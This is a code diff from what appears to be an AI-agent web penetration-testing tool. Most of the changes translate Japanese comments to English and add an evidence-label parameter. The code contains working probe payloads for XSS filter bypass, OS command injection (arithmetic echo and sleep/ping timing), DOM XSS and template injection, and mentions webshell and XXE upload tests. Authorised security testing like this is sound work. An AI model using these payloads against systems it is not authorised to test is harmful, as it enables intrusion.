   if (!auth) return { verdict: "inconclusive", reason: "no authenticated session to compare — login(role) first" };
   if (auth.status >= 300 || looksLikeLogin(auth.body))
     return { verdict: "inconclusive", reason: "authenticated baseline is itself login/redirect — cannot establish protected content" };
   return { verdict: "needs_judgment", reason: "unauth returned 200 & non-login; judge whether it IS the protected content" };
 }
 
-/** 観測リンクから frontier に積むべき in-scope URL を返す(純粋)。
- *  ハードロック(URL リスト固定)では空 = 発見リンクを辿らない(横断クロールしない)。
- *  out-of-scope / logout 系 / ignore_paths / 訪問済みは除外。 */
+/** Return the in-scope URLs from observed links that should go on the frontier (pure).
+ *  Under a hard lock (fixed URL list), returns empty = don't follow discovered links (no cross-site crawl).
+ *  Excludes out-of-scope / logout-ish / ignore_paths / already-visited. */
 export function frontierLinks(
   o: Pick<Observation, "finalUrl" | "links"> & { virtualRoutes?: string[] },
   s: Pick<PilotSession, "scope" | "lockToSeeds" | "visited" | "ignorePaths" | "targetUrl">,
 ): string[] {
   if (s.lockToSeeds) return [];
   const out = new Set<string>();
-  // 通常のリンクに加え、driver が pushState/hashchange で採取した SPA 仮想ルートも frontier に積む
-  // (hash ルーティングの SPA は href が collapse しがちなので、実際に踏んだルートを起点に補う)。
+  // In addition to normal links, also add SPA virtual routes the driver captured via pushState/hashchange to the frontier
+  // (hash-routed SPAs tend to collapse hrefs, so we backfill from the routes actually walked).
   for (const link of [...o.links, ...(o.virtualRoutes ?? [])]) {
     let abs: string;
     try {
@@ -516,29 +516,29 @@ export function frontierLinks(
       continue;
     }
     if (!isInScope(abs, s.scope)) continue;
-    if (isSessionDestroyingPath(abs)) continue; // logout/signout リンクは frontier に積まない(踏むと自滅)
-    if (pathIsIgnored(abs, s.ignorePaths, s.targetUrl)) continue; // モデルが間引いた低価値パスは積まない
+    if (isSessionDestroyingPath(abs)) continue; // don't add logout/signout links to the frontier (self-sabotage if walked)
+    if (pathIsIgnored(abs, s.ignorePaths, s.targetUrl)) continue; // don't add low-value paths the model pruned
     if (!s.visited.has(abs)) out.add(abs);
   }
   return [...out];
 }
 
-/** 診断プローブの応答ステータスを集計(認証壁サーキットブレーカ用)。401=壁、2xx=通過。 */
+/** Tally diagnosis-probe response statuses (for the auth-wall circuit breaker). 401 = wall, 2xx = got through. */
 function bumpHttp(s: PilotSession, status: number): void {
   s.httpProbes += 1;
-  s.screenProbes += 1; // 画面ごとの診断アクティビティ(screen_done ゲートの裏取り)
+  s.screenProbes += 1; // per-screen diagnosis activity (cross-checks the screen_done gate)
   if (status === 401) s.httpAuthWall += 1;
   else if (status >= 200 && status < 300) s.httpThrough += 1;
 }
 
-/** 画面プランの `classes=[a,b,c]` 接頭辞から、計画した攻撃クラスを正準化して取り出す(カバレッジ・ゲート用)。
- *  info-disclosure/headers/misconfig 等の「単発で出る」クラスは網羅強制の対象外(プランに無くても発見されうる)。 */
+/** Pull the planned attack classes out of a screen plan's `classes=[a,b,c]` prefix, canonicalized (for the coverage gate).
+ *  "One-shot" classes like info-disclosure/headers/misconfig are exempt from coverage enforcement (they can surface even if not in the plan). */
 export function plannedClassesFor(plan: string | undefined): string[] {
   if (!plan) return [];
   const m = /^classes=\[([^\]]*)\]/.exec(plan);
   if (!m) return [];
   const raw = (m[1] ?? "").split(",").map((c) => c.trim()).filter(Boolean);
-  // 受動的・機会的に見つかるクラス(計画に書かれてもアクティブ網羅の強制対象にしない)。
+  // Classes found passively/opportunistically (not forced into active coverage even if written into the plan).
   const EXCLUDED = new Set(["other", "headers", "info-disclosure", "misconfig"]);
   const out = new Set<string>();
   for (const c of raw) {
@@ -548,9 +548,9 @@ export function plannedClassesFor(plan: string | undefined): string[] {
   return [...out];
 }
 
-/** screen_done のカバレッジ・ゲート(純粋)。計画した攻撃クラスを coverage が全部説明していて、かつ
- *  「tested-clean/found を主張するなら最低1回は probe している」ことを要求する。満たさなければ差し戻し理由を返す。
- *  プランにクラスが無い画面(計画なし/info系のみ)はゲート対象外(従来どおり閉じれる)。 */
+/** screen_done coverage gate (pure). Requires that coverage accounts for every planned attack class, and that
+ *  "if you claim tested-clean/found, you probed at least once". Returns a reject reason if not satisfied.
+ *  Screens with no classes in the plan (no plan / info-only) are exempt from the gate (can close as before). */
 export function checkScreenCoverage(
   planned: string[],
   coverage: ReadonlyArray<{ class: string; result: string }>,
@@ -575,17 +575,17 @@ export function checkScreenCoverage(
   return { ok: true };
 }
 
-/** survey_done の認証ゲート(純関数): ロールが設定されているのに認証セッションが立っていなければ拒否。
- *  匿名のまま survey を閉じると post-login サーフェスが丸ごと未マップになり、画面数が静かに半減する。
- *  authActive = currentCookie か Bearer が非空か(currentRole が立つだけでは不可 — attended は誤陽性になる)。 */
+/** survey_done auth gate (pure): reject if roles are configured but no authenticated session is up.
+ *  Closing survey while anonymous leaves the entire post-login surface unmapped, silently halving the screen count.
+ *  authActive = currentCookie or Bearer is non-empty (currentRole being set is not enough — attended would false-positive). */
 export function surveyAuthGate(roleCount: number, authActive: boolean): { ok: true } | { ok: false } {
   return roleCount > 0 && !authActive ? { ok: false } : { ok: true };
 }
 
-/** 証拠規律の構造チェック(純粋・カテゴリ非依存)。runValidator と同じ規律を pilot finding に強制する:
- *  (1) positive replay が ≥2 で互いに安定(status 一致・本文長が ±64 以内)= 再現性、
- *  (2) negative control が positive と区別できる(status 違い or 本文長差 >64)= catch-all でない実差分。
- *  これを満たさない record_finding は reject する(幻/弱い finding の主要 FP モードを封じる)。 */
+/** Structural evidence-discipline check (pure, category-independent). Enforces the same discipline as runValidator on pilot findings:
+ *  (1) ≥2 positive replays that are mutually stable (matching status, body length within ±64) = reproducibility,
+ *  (2) a negative control distinguishable from the positives (different status or body-length delta >64) = a real diff, not a catch-all.
+ *  record_finding calls that fail this are rejected (seals the main FP mode of hallucinated/weak findings). */
 export function checkEvidenceDiscipline(
   neg: { status: number; bodyLen: number },
   positives: ReadonlyArray<{ status: number; bodyLen: number }>,
@@ -599,9 +599,9 @@ export function checkEvidenceDiscipline(
   return { ok: true };
 }
 
-/** ビジネスロジックの証拠規律(純粋・マーカーベース)。長さ差分ではなく「操作が効いた印(effectMarker)」で判定する:
- *  改変リクエスト(positive)で marker が出て、正規リクエスト(control)では出ず、positive が ≥2 で安定&受理(<400)なら ok。
- *  price=1 が通る/role=admin が反映される 等、status/長さがほぼ同じでも意味的差分を捉える。 */
+/** Business-logic evidence discipline (pure, marker-based). Judged by "a sign the manipulation took effect (effectMarker)", not length delta:
+ *  ok if the marker appears in the manipulated request (positive), is absent in the legitimate request (control), and positives are ≥2, stable & accepted (<400).
+ *  Captures semantic diffs like price=1 going through / role=admin being reflected, even when status/length are nearly identical. */
 export function checkLogicEvidence(
   control: { status: number; hasMarker: boolean },
   positives: ReadonlyArray<{ status: number; hasMarker: boolean }>,
@@ -614,8 +614,8 @@ export function checkLogicEvidence(
   return { ok: true };
 }
 
-/** 認証壁サーキットブレーカ判定(純粋): 十分なサンプルがあり、何も通らず(2xx ゼロ)、finding ゼロで、
- *  ほぼ全部 401 なら true。診断ループはこれが立ったら以降の画面を止めて handoff を上げる。 */
+/** Auth-wall circuit-breaker check (pure): true when there's a sufficient sample, nothing got through (zero 2xx), zero findings,
+ *  and nearly all responses are 401. When this trips, the diagnosis loop stops the remaining screens and raises a handoff. */
 export function isAuthWalled(
   s: { findings: { length: number }; httpProbes: number; httpThrough: number; httpAuthWall: number },
   minSample = 12,
@@ -623,7 +623,7 @@ export function isAuthWalled(
   return s.findings.length === 0 && s.httpProbes >= minSample && s.httpThrough === 0 && s.httpAuthWall / s.httpProbes >= 0.85;
 }
 
-/** 観測 1 件を screens に永続化(自動でカバレッジ台帳 queued 登録)し、frontier を更新。 */
+/** Persist one observation to screens (auto-enrolls it as queued in the coverage ledger) and update the frontier. */
 function recordObservation(s: PilotSession, o: Observation): { screen: Screen; isNew: boolean } {
   const authState = s.currentRole ? "post-login" : "unauth";
   const { screen, isNew } = s.inv.ingest(o, authState);
@@ -631,8 +631,8 @@ function recordObservation(s: PilotSession, o: Observation): { screen: Screen; i
   const here = stripHash(o.finalUrl);
   s.visited.add(here);
   s.frontier.delete(here);
-  // 探索上限(--max-survey-screens): 到達したら frontier を空にし、以降は発見リンクを積まない
-  //   (これ以上写像しない → survey_status のフロンティアが空になりモデルが survey_done を呼ぶ)。
+  // Exploration cap (--max-survey-screens): on reaching it, empty the frontier and add no further discovered links
+  //   (map no more → survey_status's frontier goes empty and the model calls survey_done).
   if (s.maxSurveyScreens != null && s.inv.screens().length >= s.maxSurveyScreens) {
     if (!s.surveyCapped) {
       s.surveyCapped = true;
@@ -640,15 +640,15 @@ function recordObservation(s: PilotSession, o: Observation): { screen: Screen; i
       s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🧭 survey cap reached (${s.maxSurveyScreens} screens) — stopping exploration; remaining links not followed` } });
     }
   } else {
-    // 画面 + その API は記録済み(上の ingest)。ハードロックなら発見リンクは積まない(frontierLinks が [])。
+    // The screen + its APIs are already recorded (the ingest above). Under a hard lock, add no discovered links (frontierLinks returns []).
     for (const abs of frontierLinks(o, s)) s.frontier.add(abs);
   }
   return { screen, isNew };
 }
 
-/** 画面のスクショを artifacts/screens/<id>.png に保存し、screen.screenshot を更新(WebUI 表示用)。 */
+/** Save the screen's screenshot to artifacts/screens/<id>.png and update screen.screenshot (for WebUI display). */
 async function captureScreenshot(s: PilotSession, screen: Screen): Promise<void> {
-  if (screen.screenshot) return; // 既に撮影済み
+  if (screen.screenshot) return; // already captured
   const rel = `screens/${screen.screenId}.png`;
   const okShot = await s.driver.saveScreenshot(join(s.artifactsDir, rel));
   if (okShot) {
@@ -657,7 +657,7 @@ async function captureScreenshot(s: PilotSession, screen: Screen): Promise<void>
   }
 }
 
-/** インベントリ全体から、他画面で観測した識別子(IDOR 用)を集める。 */
+/** Collect identifiers observed on other screens from the whole inventory (for IDOR). */
 function knownObjectIds(s: PilotSession): string[] {
   const out = new Set<string>();
   for (const sc of s.inv.screens()) {
@@ -686,9 +686,9 @@ function screenDigest(sc: Screen): Record<string, unknown> {
   };
 }
 
-/** get_inventory 用のコンパクト要約。フル digest(params/apis をオブジェクト配列で持つ)は大規模 survey で
- *  コンテキストを溢れさせ(106K で methodology が screenId を取得できず迷走したバグ)、計画には過剰。
- *  名前だけ/エンドポイント文字列に畳んで小さくする。フルの per-param 型は診断段の get_screen が返す。 */
+/** Compact summary for get_inventory. The full digest (params/apis as arrays of objects) overflows context on large surveys
+ *  (the bug where at 106K methodology couldn't get a screenId and lost its way) and is overkill for planning.
+ *  Fold down to names only / endpoint strings to keep it small. The full per-param types are returned by get_screen in the diagnosis stage. */
 function screenBrief(sc: Screen): Record<string, unknown> {
   return {
     screenId: sc.screenId,
@@ -704,22 +704,22 @@ function screenBrief(sc: Screen): Record<string, unknown> {
 
 export function buildTools(s: PilotSession) {
   return [
-    // ───────────────────────── 調査(STAGE 1) ─────────────────────────
+    // ───────────────────────── survey (STAGE 1) ─────────────────────────
     tool(
       "browser_navigate",
       "Navigate the browser to an in-scope URL. Registers the page as a screen (auto-enrolled into the coverage ledger) and returns its screenId plus state and newly discovered in-scope links.",
       { url: z.string() },
       async ({ url }) => {
         if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
-        // logout/signout への遷移はセッションを破棄し以降の認証診断を全滅させるので踏まない。
+        // Don't navigate to logout/signout: it destroys the session and wipes out all subsequent auth diagnosis.
         if (isSessionDestroyingPath(url))
           return txt(`SKIPPED: ${url} is a logout/sign-out path. Navigating to it would break the auth session and wipe out all subsequent diagnosis, so it is not visited.`);
         try {
           const o = await s.driver.visit(url);
           const { screen, isNew } = recordObservation(s, o);
           await captureScreenshot(s, screen);
-          // ── 入力欄スイープ ── この画面のフォーム/検索を benign 値で送信して、出てきた新ルート/API を frontier に積む。
-          //    「入力欄を全部触る」= 入力ゲートの裏に隠れた機能/エンドポイントを取りこぼさないため。logout/スコープ外は弾く。
+          // ── input sweep ── submit this screen's forms/searches with benign values and add any new routes/APIs that surface to the frontier.
+          //    "touch every input field" = so we don't miss features/endpoints hidden behind an input gate. logout/out-of-scope are filtered out.
           let swept = 0;
           let sweptAdded = 0;
           if (s.inputSweep && !s.lockToSeeds && isNew) {
@@ -865,11 +865,11 @@ export function buildTools(s: PilotSession) {
       "Finish the SURVEY stage once the frontier is empty and every role's authenticated surface is mapped. Provide a one-line coverage summary.",
       { summary: z.string() },
       async ({ summary }) => {
-        // 構造的な認証ゲート: ロールが設定されているのに認証セッションが一度も立っていない
-        // (currentCookie も Bearer も空)なら、post-login サーフェスが丸ごと未マップ＝匿名 survey。
-        // ここで survey_done を拒否し、各ロールで login() してから完了させる(evidence discipline /
-        // screen_done の coverage gate と同じ「省略を構造で防ぐ」思想)。attended の primary も、
-        // 手動ログインが実際に cookie を生むまでは未認証扱いになる(currentRole が立つだけでは通さない)。
+        // Structural auth gate: if roles are configured but no authenticated session was ever established
+        // (both currentCookie and Bearer empty), the entire post-login surface is unmapped = an anonymous survey.
+        // Refuse survey_done here and require login() per role before completing (same "structurally prevent
+        // eliding work" philosophy as evidence discipline / screen_done's coverage gate). Even the attended primary
+        // is treated as unauthenticated until the manual login actually yields a cookie (currentRole being set isn't enough).
         const roles = availableRoles(s);
         const authActive = !!(s.currentCookie || s.currentBearer);
         if (!surveyAuthGate(roles.length, authActive).ok) {
@@ -890,7 +890,7 @@ export function buildTools(s: PilotSession) {
       },
     ),
 
-    // ───────────────────────── 方法論(STAGE 2) ─────────────────────────
+    // ───────────────────────── methodology (STAGE 2) ─────────────────────────
     tool(
       "get_inventory",
       "Return the mapped screen inventory as a COMPACT per-screen brief (screenId, url, type, auth, labels, param NAMES, API endpoints) — enough to plan an attack per screen and to spot multi-step workflows. PAGINATED so a large survey can't overflow the context: pass offset/limit (default limit 60, max 120); the response includes `total` and `nextOffset` (call again with nextOffset until it is null). Use the exact `screenId` values returned here for record_methodology.",
@@ -917,8 +917,8 @@ export function buildTools(s: PilotSession) {
       "Record the attack plan for ONE screen: which vulnerability classes apply and concretely how to test them. Call once per screen; every screen must get a plan.",
       { screenId: z.string(), vulnClasses: z.array(z.string()), plan: z.string() },
       async ({ screenId, vulnClasses, plan }) => {
-        // screenId は実在の画面でなければ拒否。さもないと診断段で plans.get(real-id) に当たらず計画が黙って失われる
-        //   (= モデルが ID 形式を当てずっぽうで探って迷走したバグ)。拒否メッセージで実 ID 例を見せて即復帰させる。
+        // Reject if screenId isn't a real screen. Otherwise the diagnosis stage's plans.get(real-id) misses and the plan is silently lost
+        //   (= the bug where the model guessed at the ID format and lost its way). Show real ID examples in the reject message to recover immediately.
         if (!s.inv.screens().some((x) => x.screenId === screenId)) {
           const sample = s.inv.screens().slice(0, 6).map((x) => x.screenId).join(", ");
           return txt(`REJECTED: '${screenId}' is not a mapped screenId. Use the EXACT screenId from get_inventory (e.g. ${sample || "s-0001"}). screen IDs look like s-0001, s-0002 — not paths. Call get_inventory (paginated) to read them.`);
@@ -942,7 +942,7 @@ export function buildTools(s: PilotSession) {
       },
     ),
 
-    // ───────────────────────── 診断(STAGE 3) ─────────────────────────
+    // ───────────────────────── diagnosis (STAGE 3) ─────────────────────────
     tool(
       "get_screen",
       "Return the screen currently under diagnosis: its full detail, its planned checks, the roles available, and known object ids seen on other screens (for cross-user access-control tests).",
@@ -955,7 +955,7 @@ export function buildTools(s: PilotSession) {
           JSON.stringify({
             screen: { ...screenDigest(sc), observedUrls: sc.observedUrls.slice(0, 6), description: sc.description },
             plan: s.plans.get(sc.screenId) ?? "(no recorded plan — use judgement)",
-            // 必ず潰すチェックリスト。screen_done は各クラスの coverage を要求する(1個見つけて打ち切るのを防ぐ)。
+            // The checklist that must be worked through. screen_done requires coverage of each class (prevents stopping after the first find).
             plannedClasses: plannedClassesFor(s.plans.get(sc.screenId)),
             currentRole: s.currentRole || "unauth",
             rolesAvailable: availableRoles(s),
@@ -967,13 +967,17 @@ export function buildTools(s: PilotSession) {
     ),
     tool(
       "http_request",
-      "Send a scoped raw HTTP request to probe a hypothesis (IDOR/auth/exposure). Uses the current login session. Records evidence; returns an evidenceId to cite in findings. The full response body is scanned for CONCRETE IMPACT (leaked /etc/passwd, private keys/secrets, command output like uid=…, cross-user data) and any hit is surfaced in `impact` — that is your effectMarker for a CONFIRMED finding. For an IDOR/BOLA test, pass `victimId` (the other user's id you requested) and `selfId` (your own id): if the response carries the victim's id but not yours, you get a cross-user impact hit = the IDOR is real. FILE UPLOAD: pass `files` (and optional `fields`) to send a correct multipart/form-data upload — the boundary/CRLF are built for you (do NOT hand-craft a multipart body in `body`). Each file has {name (the form field), filename, contentType?, and either `content` (text, e.g. an XXE SVG) or `base64` (binary/magic-byte polyglot)}. Use this to test upload attacks: XXE via an SVG DOCTYPE ENTITY, a webshell behind image magic bytes (e.g. GIF89a; then <?php…), a pickle/deserialization blob, extension/type-filter bypass.",
+      "Send a scoped raw HTTP request to probe a hypothesis (IDOR/auth/exposure). Uses the current login session. Records evidence; returns an evidenceId to cite in findings. The full response body is scanned for CONCRETE IMPACT (leaked /etc/passwd, private keys/secrets, command output like uid=…, cross-user data) and any hit is surfaced in `impact` — that is your effectMarker for a CONFIRMED finding. For an IDOR/BOLA test, pass `victimId` (the other user's id you requested) and `selfId` (your own id): if the response carries the victim's id but not yours, you get a cross-user impact hit = the IDOR is real. FILE UPLOAD: pass `files` (and optional `fields`) to send a correct multipart/form-data upload — the boundary/CRLF are built for you (do NOT hand-craft a multipart body in `body`). Each file has {name (the form field), filename, contentType?, and either `content` (text, e.g. an XXE SVG) or `base64` (binary/magic-byte polyglot)}. Use this to test upload attacks: XXE via an SVG DOCTYPE ENTITY, a webshell behind image magic bytes (e.g. GIF89a; then <?php…), a pickle/deserialization blob, extension/type-filter bypass. EVIDENCE LABEL — when you send the benign/baseline CONTROL for a finding (no payload, or a non-existent id; it MUST fail), pass kind:'negative_control'; attack requests are kind:'positive_replay' (the default). Labeling the control makes the control-fails + ≥2-positives discipline explicit in the evidence.",
       {
         method: z.string(),
         url: z.string(),
         headers: z.record(z.string()).optional(),
         body: z.string().optional(),
         note: z.string().optional(),
+        kind: z
+          .enum(["negative_control", "positive_replay"])
+          .optional()
+          .describe("evidence role: 'negative_control' = a benign/baseline request that MUST fail (no payload / non-existent id); 'positive_replay' (default) = an attack request that should succeed. Label the control so the evidence discipline is visible in the report/UI."),
         victimId: z.string().optional().describe("for IDOR: the other user's id you are requesting (cross-user impact check)"),
         selfId: z.string().optional().describe("for IDOR: your own session's id (so your own data isn't mistaken for cross-user access)"),
         fields: z.record(z.string()).optional().describe("form fields to send alongside file(s) in a multipart upload"),
@@ -982,7 +986,7 @@ export function buildTools(s: PilotSession) {
           .optional()
           .describe("file part(s) for a multipart upload; each has a text `content` OR binary `base64`"),
       },
-      async ({ method, url, headers, body, note, victimId, selfId, fields, files }) => {
+      async ({ method, url, headers, body, note, kind, victimId, selfId, fields, files }) => {
         if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
         const multipart =
           files && files.length
@@ -1010,7 +1014,7 @@ export function buildTools(s: PilotSession) {
         } catch (e) {
           return txt(`ERROR: ${String(e).slice(0, 200)}`);
         }
-        // multipart はバイナリなので証拠には人間可読の要約(フィールド + ファイルの中身プレビュー)を残す。
+        // multipart is binary, so keep a human-readable summary (fields + a preview of file contents) as evidence.
         const evBody = multipart
           ? `[multipart/form-data]\nfields: ${JSON.stringify(fields ?? {})}\n` +
             (files ?? []).map((f) => `file "${f.name}" filename="${f.filename}" (${f.contentType ?? "?"}):\n${(f.content ?? `<base64 ${f.base64?.length ?? 0}B>`).slice(0, 1500)}`).join("\n---\n")
@@ -1018,12 +1022,12 @@ export function buildTools(s: PilotSession) {
         const ev = s.evidence.record({
           screenId: s.currentScreenId ?? "pilot",
           validator: "claude-pilot",
-          kind: "positive_replay",
-          request: { ...req, headers: s.http.effectiveHeaders(req.headers), body: evBody }, // 送信ヘッダ全部を証拠に残す
+          kind: kind ?? "positive_replay",
+          request: { ...req, headers: s.http.effectiveHeaders(req.headers), body: evBody }, // keep all sent headers as evidence
           response: res,
           note: note ?? `${req.method} ${url} as ${s.currentRole || "unauth"}`,
         });
-        // impact オラクル: 応答全文(1800 切り詰め前)を走査。hit は CONFIRMED の effectMarker になる。
+        // impact oracle: scan the full response (before the 1800 truncation). A hit becomes the effectMarker for a CONFIRMED finding.
         const impact = impactOracle(res.body, {
           ...(victimId ? { requestedIdentity: victimId } : {}),
           ...(selfId ? { sessionIdentity: selfId } : {}),
@@ -1051,9 +1055,9 @@ export function buildTools(s: PilotSession) {
       { role: z.string() },
       async ({ role }) => {
         const desc = s.roleDescriptions.get(role);
-        const tag = desc ? ` [${desc}]` : ""; // 権限説明(あれば)を応答に添える
-        // ⓪ attended(手動マルチセッション): ロールごとに既に生きたコンテキストがある。
-        //    ログインし直さず、アクティブな driver / cookie をそのロールへ swap するだけ。
+        const tag = desc ? ` [${desc}]` : ""; // attach the privilege description (if any) to the response
+        // ⓪ attended (manual multi-session): each role already has a live context.
+        //    Don't re-login; just swap the active driver / cookie to that role.
         const live = s.roleSessions?.get(role);
         if (live) {
           s.driver = live.driver;
@@ -1064,7 +1068,7 @@ export function buildTools(s: PilotSession) {
           s.currentRole = role;
           return txt(`switched to live attended session for role '${role}'${tag} (manual login; cookie ${live.cookie ? "present" : "empty"}${s.currentBearer ? ", bearer present" : ""}).`);
         }
-        // ① 事前取得 Cookie ファイルがあれば、ログインせずに注入(自動ログイン不能な壁向け)。
+        // ① If there's a pre-captured Cookie file, inject it without logging in (for walls that can't be auto-logged-in).
         const cookieFile = s.roleCookieFiles.get(role);
         if (cookieFile) {
           try {
@@ -1080,7 +1084,7 @@ export function buildTools(s: PilotSession) {
             return txt(`cookie file error for '${role}': ${String(e).slice(0, 150)}`);
           }
         }
-        // ② 資格情報で smartLogin。
+        // ② smartLogin with credentials.
         const creds = s.roleCreds.get(role);
         if (!creds) {
           const avail = availableRoles(s).map((r) => (r.description ? `${r.name} (${r.description})` : r.name)).join(", ") || "none";
@@ -1140,7 +1144,7 @@ export function buildTools(s: PilotSession) {
           const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-xss", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `xss ${tag}` });
           return { evId: ev.id, status: res.status, body: res.body };
         };
-        // 各 payload の marker = 未エスケープで生き残った時だけ応答に現れる決定的な部分文字列(real <>/handler)。
+        // Each payload's marker = a deterministic substring (real <>/handler) that appears in the response only when it survives unescaped.
         const corpus = [
           { name: "img-onerror", payload: `<img src=x onerror=alert('${tok}')>`, marker: `<img src=x onerror=alert('${tok}')>` },
           { name: "attr-break-svg", payload: `"><svg onload=alert('${tok}')>`, marker: `<svg onload=alert('${tok}')>` },
@@ -1162,7 +1166,7 @@ export function buildTools(s: PilotSession) {
         }
         if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{XSS}}.");
         const reflected = benign.body.includes(benignMarker);
-        // ── フィルタ回避コーパス反復 ── 生き残る payload を探す(1発ずつ)。
+        // ── filter-bypass corpus iteration ── look for a payload that survives (one at a time).
         let winner: (typeof corpus)[number] | null = null;
         let htmlCtx = false;
         const tried: string[] = [];
@@ -1191,7 +1195,7 @@ export function buildTools(s: PilotSession) {
                 : `input not reflected in the response body — not a server-reflection XSS sink. For a client-rendered/SPA route use probe_dom_xss (browser execution).`,
             }),
           );
-        // ── 生存 payload を control + 2 replay で確証(marker-based) ──
+        // ── confirm the surviving payload with control + 2 replays (marker-based) ──
         const ctrl = await recordSend(benignMarker, "negative_control", "control(benign)");
         const w1 = await recordSend(winner.payload, "positive_replay", `bypass ${winner.name} #1`);
         const w2 = await recordSend(winner.payload, "positive_replay", `bypass ${winner.name} #2`);
@@ -1259,17 +1263,17 @@ export function buildTools(s: PilotSession) {
         try {
           const a = 3000 + Math.floor(Math.random() * 6000);
           const b = 3000 + Math.floor(Math.random() * 6000);
-          const product = String(a * b); // 実行された時だけ応答に現れる(リテラルには積は含まれない)
+          const product = String(a * b); // appears in the response only when executed (the literal doesn't contain the product)
           const arith = `$((${a}*${b}))`;
           const outPayloads = [arith, `;echo ${arith};`, `|echo ${arith}`, `$(expr ${a} \\* ${b})`, "`expr " + a + " \\* " + b + "`", `&&echo ${arith}`, `%0aecho ${arith}%0a`];
           const benign = await rawSend("1");
           if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{CMD}}.");
-          // ── output-based(算術積マーカー) ──
+          // ── output-based (arithmetic-product marker) ──
           for (const p of outPayloads) {
             const r = await rawSend(p);
             if (!r || r.status >= 500) continue;
             if (r.body.includes(product) && !benign.body.includes(product)) {
-              // 確証: proof を distinguishable な evidence body で残す(rce は length gate)。
+              // Confirm: keep proof as a distinguishable evidence body (rce uses a length gate).
               const proof = `COMMAND INJECTION CONFIRMED (output-based) — payload="${p}" made the shell compute ${a}*${b}=${product}, which appears in the response (the literal expression does not contain the product, so it was EXECUTED, not echoed).`;
               const p1 = await send(p, "positive_replay", "out-proof#1", proof);
               const p2 = await send(p, "positive_replay", "out-proof#2", proof);
@@ -1278,7 +1282,7 @@ export function buildTools(s: PilotSession) {
                 return txt(JSON.stringify({ technique: "output-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: product, verdict: `OS COMMAND INJECTION CONFIRMED (output): payload ${p} → shell computed ${product}. record_finding(category rce, critical) with these evidenceIds.` }));
             }
           }
-          // ── time-based(blind) ──
+          // ── time-based (blind) ──
           const baselineMs = Math.min(benign.ms, (await rawSend("1"))?.ms ?? benign.ms);
           for (const sp of [";sleep 5;", "|sleep 5", "$(sleep 5)", "&&sleep 5", "%0asleep 5%0a", "&ping -n 5 127.0.0.1", "|ping -c 5 127.0.0.1"]) {
             const r = await rawSend(sp);
@@ -1386,18 +1390,18 @@ export function buildTools(s: PilotSession) {
       { url: z.string(), param: z.string().optional() },
       async ({ url, param }) => {
         const tok = `domX${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
-        // 実行時に window.__verdict_xss=tok を立て、alert でも出す(どちらか1つでも検出)。img.onerror は innerHTML 挿入で発火。
+        // On execution, set window.__verdict_xss=tok and also fire alert (either one is detected). img.onerror fires on innerHTML insertion.
         const payload = `"><img src=x onerror="window.__verdict_xss='${tok}';alert('${tok}')">`;
         const benign = `verdict${tok}safe`;
         const buildUrl = (val: string): string | null => {
           try {
             if (url.includes("{{XSS}}")) return url.replace(/\{\{XSS\}\}/g, encodeURIComponent(val));
             if (!param) return null;
-            // ハッシュルート対応: '#…' があればハッシュ側のクエリへ注入(URL API は hash 内を触らないため手で組む)。
+            // Hash-route support: if there's a '#…', inject into the hash-side query (the URL API doesn't touch inside the hash, so build it by hand).
             const hashAt = url.indexOf("#");
             if (hashAt >= 0) {
               const base = url.slice(0, hashAt);
-              let hash = url.slice(hashAt); // 例 '#/search?q=…'
+              let hash = url.slice(hashAt); // e.g. '#/search?q=…'
               const enc = `${encodeURIComponent(param)}=${encodeURIComponent(val)}`;
               const re = new RegExp(`([?&]${param}=)[^&]*`);
               if (hash.includes("?")) hash = re.test(hash) ? hash.replace(re, `$1${encodeURIComponent(val)}`) : `${hash}&${enc}`;
@@ -1421,7 +1425,7 @@ export function buildTools(s: PilotSession) {
             validator: "claude-pilot-dom-xss",
             kind,
             request: { method: "GET", url: u, headers: {}, body: null },
-            // 実行結果を body に符号化(executed のとき tok を含む)→ record_finding のマーカーゲートに乗る。
+            // Encode the execution result into the body (contains tok when executed) → so it passes record_finding's marker gate.
             response: { status: 200, finalUrl: u, durationMs: 0, headers: { "content-type": "text/html" }, body: r.executed ? `${r.signal} [${tok}]` : r.signal },
             note: `dom-xss ${tag}`,
           });
@@ -1461,13 +1465,13 @@ export function buildTools(s: PilotSession) {
       { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
       async ({ url, param, method, body }) => {
         const tok = `sZ${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
-        // 衝突しにくい 8 桁の積。リテラル反射では payload 文字列が返るだけ(積は出ない)→ 評価されたら積が出る。
+        // An 8-digit product unlikely to collide. Literal reflection just returns the payload string (no product) → if evaluated, the product appears.
         const a = 8000 + Math.floor(Math.random() * 1000);
         const b = 8000 + Math.floor(Math.random() * 1000);
         const product = String(a * b);
-        // 多言語ポリグロット。どれか1エンジンが評価すれば積が応答に出る。
+        // A multi-language polyglot. If any one engine evaluates it, the product appears in the response.
         const payload = `{{${a}*${b}}}\${${a}*${b}}#{${a}*${b}}<%=${a}*${b}%>`;
-        const control = `amrSSTI${tok}`; // テンプレ構文なし → 評価され得ない(積は絶対に出ない)
+        const control = `amrSSTI${tok}`; // no template syntax → can't be evaluated (the product will never appear)
         const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
           let u = url;
           let b2: string | null = null;
@@ -1493,7 +1497,7 @@ export function buildTools(s: PilotSession) {
             response: res,
             note: `ssti ${tag} ${param ?? "body"}`,
           });
-          // hasMarker = 評価結果(積)が応答に出ているか。payload リテラルが返るだけなら false。
+          // hasMarker = whether the evaluation result (the product) appears in the response. False if only the payload literal is returned.
           return { evId: ev.id, status: res.status, evaluated: res.body.includes(product), echoedLiteral: res.body.includes(payload) };
         };
         let ctrl: Awaited<ReturnType<typeof send>>;
